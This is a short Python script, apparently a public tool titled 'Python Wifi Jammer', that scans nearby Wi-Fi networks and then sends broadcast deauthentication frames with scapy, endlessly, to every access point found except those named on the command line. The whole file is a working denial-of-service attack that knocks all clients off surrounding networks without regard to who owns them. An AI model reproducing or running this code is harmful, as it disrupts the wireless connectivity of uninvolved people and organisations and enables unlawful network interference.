#!/usr/bin/python
###################################################################
#
#                      Python Wifi Jammer
#                       @mohammadaskar2
#                    http://www.isecur1ty.org
#
###################################################################
from scapy.all import *
from wifi import *
import time
import wireless
import sys

wifi1 = wireless.Wireless()
interface = wifi1.interface()

all_wifi = Cell.all(interface)
#print "SSID\t BSSID\t Channel\t Power\t"
print "[+] scannig for networks .."
bssid = []
time.sleep(2)

#Exibe os ids que devem ser exlcluidos da jamm, caso estes tenham sido definidos.
if len(sys.argv)>=2:
    print("Excluindo os seguintes SSIDs: ")
    for i in range(len(sys.argv)):
        if i > 0:
            print("\t" + sys.argv[i])

#percorre a lista de redes ao alcance
for wi in all_wifi:
 if wi.ssid not in sys.argv: # Exclui aquelas passadas como parâmetro
     print "SSID is    : "  +    wi.ssid 
     print "BSSID is   : "  +    wi.address
     print "Channel is : "  +    str(wi.channel)
     print "Quality is : "  +    str(wi.quality)
     print "+" * 20
     bssid.append(wi.address)
     time.sleep(0.5)
 

print "#" * 70

#Faz a festa.
def jam(address):
 conf.iface = "mon0"
 bssid = address   
 client = "FF:FF:FF:FF:FF:FF" #
 count = 3 
 conf.verb = 0
 packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
 for n in range(int(count)):
	sendp(packet)
        print 'Deauth num '+ str(n)  +  ' sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client


while True:
 for item in bssid: 
  print "Jamming on : {0}".format(item)
  jam(item)
